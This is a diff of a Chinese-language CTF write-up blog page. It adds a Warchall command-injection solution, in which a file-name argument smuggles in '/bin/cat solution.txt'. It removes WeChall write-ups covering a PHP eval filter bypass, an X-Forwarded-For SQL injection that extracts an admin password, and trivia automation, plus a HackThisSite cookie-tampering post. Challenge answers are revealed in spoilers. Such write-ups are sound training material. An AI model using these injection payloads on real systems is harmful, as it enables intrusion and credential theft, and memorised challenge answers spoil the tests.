+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -p 19198 &lt;username&gt;@warchall.net</span><br><span class="line">$ <span class="built_in">cd</span> /home/level/10_choose_your_path</span><br><span class="line">$ ./charp <span class="string">&quot;solution.txt 1&gt;&amp;2; /bin/cat solution.txt 1&gt;&amp;2; #&quot;</span></span><br><span class="line">8 solution.txt</span><br><span class="line"><span class="comment">#!/C:\windows\system32\ed</span></span><br><span class="line"></span><br><span class="line">Congratulations hacker,</span><br><span class="line"></span><br><span class="line">You have achieved what only a few achieve.</span><br><span class="line">Kinda.</span><br><span class="line"></span><br><span class="line">The flag or solution <span class="keyword">for</span> this challenge is: &lt;masked&gt;</span><br><span class="line">Cannot scan! Sorry!</span><br><span class="line">171 solution.txt</span><br><span class="line"><span class="comment">#!/C:\windows\system32\ed</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>输出会出现两次，是因为程序先执行 <code>wc -l</code>，再执行
+<code>wc -c</code>，两次 <code>popen()</code> 都会拼接同一个
+<code>filename</code>，所以注入的 <code>cat solution.txt</code>
+也被执行两次。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">EpidermalGlance</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1110,519 +1676,6 @@ payload，命中后判定正确；不需要真的让当前页面弹窗。</p>
 <p>如果带登录态访问同一个 URL，命中后会把挑战记到当前账号；最终以
 <code>/en/challs</code> 里 <code>Yourself PHP</code> 的
 <code>wc_chall_solved_1</code> 为准。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-php-0819/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-php-0819/" class="post-title-link" itemprop="url">WeChall - PHP 0819</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-09 16:54:03 / Modified: 16:55:33" itemprop="dateCreated datePublished" datetime="2026-06-09T16:54:03+08:00">2026-06-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-php-0819/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-php-0819/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>space 的 PHP eval 小挑战。目标是在 13
-字节以内构造一个表达式，让执行后的 <code>$spaceone</code> 严格等于字符串
-<code>1337</code>。</p>
-<p>页面给出完整源码，核心逻辑是读取 GET 参数
-<code>eval</code>，删除一批字符，限制长度，然后拼进
-<code>eval()</code>：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="title class_">Common</span>::<span class="title function_ invoke__">getGetString</span>(<span class="string">&#x27;eval&#x27;</span>);</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$f</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>) &gt; <span class="number">13</span>) || (<span class="literal">false</span> !== <span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;return&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;sorry, not allowed!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$spaceone = <span class="subst">$f</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="variable">$spaceone</span> === <span class="string">&#x27;1337&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<p>最后是 strict comparison，所以直接提交 <code>1337</code> 不行：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$spaceone</span> = <span class="number">1337</span>;</span><br></pre></td></tr></table></figure>
-<p>这样得到的是 integer <code>1337</code>，不是 string
-<code>"1337"</code>。</p>
-<h3 id="solution">Solution</h3>
-<p>约束很紧：</p>
-<ul>
-<li>引号 <code>"</code> / <code>'</code>
-会被删除，不能直接写字符串。</li>
-<li><code>$</code> 会被删除，不能引用变量。</li>
-<li><code>.</code> 会被删除，不能拼接字符串。</li>
-<li><code>(</code> / <code>)</code> 会被删除，基本不能调用函数。</li>
-<li><code>&gt;</code> 会被删除，但 <code>&lt;</code> 没有被删。</li>
-<li>长度最多 13 字节，且不能包含 <code>return</code>。</li>
-</ul>
-<p>问题变成：PHP 有没有不需要引号的字符串字面量？答案是 heredoc。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;&lt;&lt;a</span></span><br><span class="line"><span class="string">1337</span></span><br><span class="line"><span class="string">a</span>;</span><br></pre></td></tr></table></figure>
-<p>这里用一字符标识符 <code>a</code>，字节数刚好卡进限制：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;a\n1337\na;\n</span><br><span class="line">4 + 1 + 4 + 1 + 2 + 1 = 13</span><br></pre></td></tr></table></figure>
-<p>payload 只用到
-<code>&lt;</code>、字母、数字、分号和换行，都不会被过滤。进入
-<code>eval()</code> 后等价于：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$spaceone</span> = <span class="string">&lt;&lt;&lt;a</span></span><br><span class="line"><span class="string">1337</span></span><br><span class="line"><span class="string">a</span>;</span><br></pre></td></tr></table></figure>
-<p>heredoc 表达式的值是字符串 <code>"1337"</code>，因此能通过
-<code>$spaceone === '1337'</code>。</p>
-<p>用 curl 提交时让 <code>--data-urlencode</code> 处理换行，避免手写
-<code>%0A</code> 出错：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL -G \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  --data-urlencode $<span class="string">&#x27;eval=&lt;&lt;&lt;a\n1337\na;\n&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/challenge/space/php0819/index.php&#x27;</span> \</span><br><span class="line">  | grep -o <span class="string">&#x27;Your answer is correct&#x27;</span></span><br><span class="line">Your answer is correct</span><br></pre></td></tr></table></figure>
-<p>等价的 URL 参数是：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval=%3C%3C%3Ca%0A1337%0Aa%3B%0A</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-the-guestbook/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-the-guestbook/" class="post-title-link" itemprop="url">WeChall - The Guestbook</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-09 16:39:10 / Modified: 16:50:57" itemprop="dateCreated datePublished" datetime="2026-06-09T16:39:10+08:00">2026-06-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-the-guestbook/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-the-guestbook/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>一个带源码的 guestbook 挑战。页面会把留言、session id、时间和访问者
-IP 写入数据库；目标是找到 Admin 的密码。</p>
-<p>关键点不在留言内容，而在 IP 来源：程序信任
-<code>X-Forwarded-For</code>，并把它当作字符串直接拼进
-<code>INSERT</code>。</p>
-<h3 id="solution">Solution</h3>
-<p>源码里的 IP 获取逻辑大致是：优先读取
-<code>$_SERVER['HTTP_X_FORWARDED_FOR']</code>，否则才使用真实远端地址。随后写入
-guestbook：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> gbook_book <span class="keyword">VALUES</span>(<span class="string">&#x27;$sessid&#x27;</span>, <span class="number">0</span>, $<span class="type">time</span>, <span class="string">&#x27;$ip&#x27;</span>, <span class="string">&#x27;$message&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p><code>$message</code> 会被正常处理，但 <code>$ip</code>
-没有转义。因为 <code>$ip</code> 被包在单引号里，可以用
-<code>X-Forwarded-For</code> 关闭当前字符串，再补齐后面的
-<code>VALUES</code> 字段。</p>
-<p>先构造一个不依赖盲注的 payload：把 Admin 密码查出来，直接写到
-guestbook 的 message 字段里。</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27;, (SELECT gbu_password FROM gbook_user WHERE gbu_name=&#x27;Admin&#x27;))#</span><br></pre></td></tr></table></figure>
-<p>代入后 SQL 变成：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> gbook_book <span class="keyword">VALUES</span>(</span><br><span class="line">  <span class="string">&#x27;$sessid&#x27;</span>,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  $<span class="type">time</span>,</span><br><span class="line">  <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">  (<span class="keyword">SELECT</span> gbu_password <span class="keyword">FROM</span> gbook_user <span class="keyword">WHERE</span> gbu_name<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span>))#<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">  &#x27;</span>$message<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
-<p><code>#</code> 注释掉原本剩下的
-<code>', '$message')</code>，于是子查询结果会作为留言内容落库。</p>
-<p>实际提交时需要带登录 cookie，并先从页面取当前 CSRF token：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Forwarded-For: 127.0.0.1&#x27;,(SELECT gbu_password FROM gbook_user WHERE gbu_name=&#x27;Admin&#x27;))#&quot;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;message=test&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;sign=Sign Guestbook&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;gwf3_csrf=TOKEN&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/guestbook/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>再刷新 guestbook，刚插入的记录会显示 Admin 密码。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">TheBrownFoxAndTheLazyDog</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-trivia/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-trivia/" class="post-title-link" itemprop="url">WeChall - Trivia</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-09 16:36:01 / Modified: 16:37:31" itemprop="dateCreated datePublished" datetime="2026-06-09T16:36:01+08:00">2026-06-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-trivia/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-trivia/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>WeChall 自带的随机问答挑战。每次访问页面会随机显示一道选择题，需要在
-60 秒内提交正确答案。答对若干题后自动完成。</p>
-<p>题目范围覆盖计算机历史、技术术语、影视、文学、地理等类别，随机抽取。</p>
-<h3 id="solution">Solution</h3>
-<p>每道题都有一个 60
-秒的计时器，表面看需要广泛的知识储备才能通过。但挑战的题库文件意外地暴露在
-Web 上。</p>
-<h4 id="题库泄露">题库泄露</h4>
-<p>挑战页面所在的目录下有一个隐藏子目录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/trivia/74k37h053/</span><br></pre></td></tr></table></figure>
-<p>目录名 <code>74k37h053</code> 是 leetspeak，指向 3
-个纯文本文件，包含了完整的问答数据库：</p>
-<table>
-<colgroup>
-<col style="width: 45%" />
-<col style="width: 5%" />
-<col style="width: 48%" />
-</colgroup>
-<thead>
-<tr>
-<th>文件</th>
-<th>题数</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>gizmore.txt</code></td>
-<td>7</td>
-<td>Gizmore 自创的冷门题</td>
-</tr>
-<tr>
-<td><code>z.txt</code></td>
-<td>116</td>
-<td>综合题库（影视/文学/历史/技术）</td>
-</tr>
-<tr>
-<td><code>InternalAffairs-Computers.txt</code></td>
-<td>59</td>
-<td>计算机/技术专项（缩写/历史/网络）</td>
-</tr>
-</tbody>
-</table>
-<p>每题的格式统一：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Category/Answer1/AlternativeAnswer//Question text?</span><br></pre></td></tr></table></figure>
-<p>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/Acronyms-Hardware/Central Processing Unit//What does CPU stand for?</span><br><span class="line">/History-Computers/Moore&#x27;s Law/Moore//What law says that the number of transistors doubles every 18 months?</span><br><span class="line">/Technical-Networks/Tier-1 (T1)/Tier-1/T-1/T1//1.544 Mbps is the transfer rate of which common broadband technology?</span><br><span class="line">/Computers/Dmitry Sklyarov//Who was arrested at DEFCON in 2001?</span><br><span class="line">/Computers/Pretty Good Privacy//PGP is the acronym for?</span><br><span class="line">/Computers/town hall//What is the primary structure in Warcraft: Orcs &amp; Humans?</span><br><span class="line">/Celebrity/Bill Gates//Who is the most famous for getting a cake in his face?</span><br></pre></td></tr></table></figure>
-<h4 id="自动化答题">自动化答题</h4>
-<p>拿到题库后，解法就很简单了：</p>
-<ol type="1">
-<li>读取页面，提取问题文本</li>
-<li>在题库中逐条匹配，找到对应的答案</li>
-<li>在 60 秒内提交</li>
-</ol>
-<p>由于每次加载页面都会刷新 CSRF
-token，提取题目和提交需要在同一次请求中完成。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess, re</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&#x27;WC=...&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;https://www.wechall.net/challenge/trivia/index.php&#x27;</span></span><br><span class="line">qa_bank = &#123;&#125;  <span class="comment"># 从 3 个 txt 文件解析</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析题库</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_qa</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(path):</span><br><span class="line">        parts = line.strip().split(<span class="string">&#x27;//&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) == <span class="number">2</span>:</span><br><span class="line">            meta, question = parts</span><br><span class="line">            <span class="comment"># /category/answer1/answer2 → answer1</span></span><br><span class="line">            answer = meta.rsplit(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">            qa_bank[question.strip()] = answer</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一次提取 + 提交</span></span><br><span class="line">html = subprocess.run([<span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;-sL&#x27;</span>, <span class="string">&#x27;-b&#x27;</span>, cookie, url],</span><br><span class="line">    capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>).stdout</span><br><span class="line"></span><br><span class="line">question = re.search(<span class="string">r&#x27;Question:&lt;br/&gt;\s*(.*?)&lt;br/&gt;&#x27;</span>, html).group(<span class="number">1</span>)</span><br><span class="line">csrf = re.search(<span class="string">r&#x27;gwf3_csrf&quot; value=&quot;([^&quot;]+)&quot;&#x27;</span>, html).group(<span class="number">1</span>)</span><br><span class="line">answer = qa_bank.get(question.strip())</span><br><span class="line"></span><br><span class="line">subprocess.run([<span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;-sL&#x27;</span>, <span class="string">&#x27;-b&#x27;</span>, cookie, url,</span><br><span class="line">    <span class="string">&#x27;--data-urlencode&#x27;</span>, <span class="string">f&#x27;answer=<span class="subst">&#123;answer&#125;</span>&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;--data-urlencode&#x27;</span>, <span class="string">&#x27;cmd=Answer&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;--data-urlencode&#x27;</span>, <span class="string">f&#x27;gwf3_csrf=<span class="subst">&#123;csrf&#125;</span>&#x27;</span>],</span><br><span class="line">    capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
-<p>答对约 10-15 道不同的题后，页面显示 "already solved"，挑战完成。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-10/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/HackThisSite/hackthissite-basic-10/" class="post-title-link" itemprop="url">HackThisSite - Basic Mission 10</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-08 22:40:44 / Modified: 22:40:46" itemprop="dateCreated datePublished" datetime="2026-06-08T22:40:44+08:00">2026-06-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/HackThisSite/hackthissite-basic-10/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-basic-10/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>This time Sam used a more temporary and "hidden" approach to
-authenticating users, but he didn't think about whether or not those
-users knew their way around javascript...</p>
-<p>Sam
-使用了一种更临时、更"隐蔽"的方式来认证用户，但他没考虑到用户是否懂
-JavaScript。</p>
-</blockquote>
-<p>页面有一个密码输入框。</p>
-<h3 id="solution">Solution</h3>
-<p>访问页面时，服务器会设置一个 cookie：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: level10_authorized=no</span><br></pre></td></tr></table></figure>
-<p>提交密码时，服务器检查这个 cookie 的值。如果
-<code>level10_authorized=no</code>，则拒绝访问。</p>
-<p>解法：将 cookie 值改为 <code>yes</code>，然后提交表单。</p>
-<p><strong>方式一</strong>：浏览器开发者工具 Console：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;level10_authorized=yes&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p><strong>方式二</strong>：curl：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL \</span><br><span class="line">    -b <span class="string">&#x27;HackThisSite=YOUR_COOKIE; level10_authorized=yes&#x27;</span> \</span><br><span class="line">    -e <span class="string">&#x27;https://www.hackthissite.org/missions/basic/10/&#x27;</span> \</span><br><span class="line">    -d <span class="string">&#x27;password=&#x27;</span> \</span><br><span class="line">    <span class="string">&#x27;https://www.hackthissite.org/missions/basic/10/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>核心知识点：Cookie 是存储在客户端的，用户可以随意修改。不要依赖客户端
-cookie 来做安全认证决策。任何存储在客户端的状态都可以被篡改。</p>
 
       
     </div>
